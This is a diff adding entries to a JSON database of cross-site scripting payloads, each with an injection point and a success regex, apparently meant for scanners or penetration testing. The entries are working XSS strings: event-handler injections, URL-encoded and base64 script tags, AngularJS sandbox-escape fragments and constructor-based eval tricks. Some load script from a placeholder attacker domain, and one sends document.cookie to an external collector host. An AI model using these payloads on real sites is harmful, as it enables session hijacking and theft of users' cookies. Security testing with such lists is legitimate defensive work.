@@ -6796,5 +6796,401 @@
       "expected_status_code": 200,
       "success_regex": "<script>alert|prompt|confirm"
     }
+  },
+  {
+    "payload_id": "OWP-240772",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Linux",
+    "injection_point": "form_parameter",
+    "payload_string": "window.location=\"/etc/passwd\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246284",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246328",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "script=document.createElement('script');",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246329",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "script.src='//[ATTACKER.DOMAIN.TLD]/csp.js';",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246331",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "d=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[ATTACKER.DOMAIN.TLD]\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246337",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "c=''.sub.call;b=''.sub.bind;a=''.sub.apply;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246340",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "C=c.$apply(c);$root.$$phase=op;$root.$digest=od;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246341",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "B=C(b,c,b);$evalAsync(\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246342",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "astNode=pop();astNode.type='UnaryExpression';",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246343",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246344",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "astNode.argument={type:'Identifier',name:'foo'};",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246346",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "m1=B($$asyncQueue.pop().expression,null,$root);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246347",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "m2=B(C,null,m1);[].push.apply=m2;a=''.sub;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246381",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "_.src='//localhost/m';",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246384",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246390",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "_.src=\\'//localhost/m\\';",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246392",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "toString.constructor.prototype.toString=toString.constructor.prototype.call;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246397",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "a=toString().constructor.prototype;a.charAt=a.trim;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246401",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "_.src=\\'//localhost/m\\';document.body.appendChild(_);`),a')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246402",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246448",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "onload=alert(1)>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246878",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "style=xss:expression(alert(1))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246896",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "b=\"URL(\\\"\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246897",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "c=\"javascript:\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246898",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "d=\"alert('XSS');\\\")\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-247503",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": " onmouseover=\"document.cookie=true;\">//INJECTX",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-399191",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-399324",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3Cbody%20onload=alert(document.cookie)%3E",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-399384",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%22%20onload=%22this.src='http://www.unirostock.de';this.onload=function(){};%22%20x=%22",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-399390",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "oncontextmenu=prompt(document.cookie)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-399833",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "d=\"alert('CrossSiteScripting');\\\")\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-399875",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "i.src=\"http://YourXSSHunterDomain/?\"+document.cookie;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-408176",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "onmouseover=alert(/xss/)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-408267",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%20onmouseover=alert(/XSS/)%20x=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-408904",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-408905",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
   }
 ]
